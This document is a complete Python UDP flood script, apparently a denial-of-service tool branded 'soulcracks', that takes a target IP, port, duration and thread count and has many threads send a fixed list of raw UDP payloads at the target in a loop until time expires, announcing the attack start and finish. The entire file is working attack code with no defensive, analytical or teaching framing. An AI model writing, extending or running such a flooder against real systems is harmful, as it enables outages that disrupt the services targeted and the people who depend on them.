import socket
import threading
import time
import sys

def usage():
    print("Usage: python soulcracks.py ip port time threads")
    sys.exit(1)

class ThreadData:
    def __init__(self, ip, port, duration):
        self.ip = ip
        self.port = port
        self.duration = duration

def attack(data):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_addr = (data.ip, data.port)
    endtime = time.time() + data.duration

    payloads = [
        b"\xd9\x00",
        b"\x00\x00",
        b"\x00\x00",
        b"\x00\x00",
        b"\x00\x00",
        b"\xd9\x00\x00",
        b"\xd9\x00\x00",
        b"\xd9\x00\x00",
        b"\xd9\x00\x00",
        b"\x72\xfe\x1d\x13\x00\x00",
        b"\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        b"\x0d\x0a\x0d\x0a\x00\x00",
        b"\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        b"\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00",
        b"\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
    ]

    while time.time() <= endtime:
        for payload in payloads:
            try:
                sock.sendto(payload, server_addr)
            except Exception as e:
                print(f"Send failed: {e}")
                sock.close()
                return
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 5:
        usage()

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    threads = int(sys.argv[4])
    
    data = ThreadData(ip, port, duration)
    
    print(f"Attack started on {ip}:{port} for {duration} seconds with {threads} threads")

    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=attack, args=(data,))
        t.start()
        thread_list.append(t)
        print(f"Launched thread with ID: Soulcracks {t.ident}")
    
    for t in thread_list:
        t.join()

    print("Attack finished join @soulcracks")
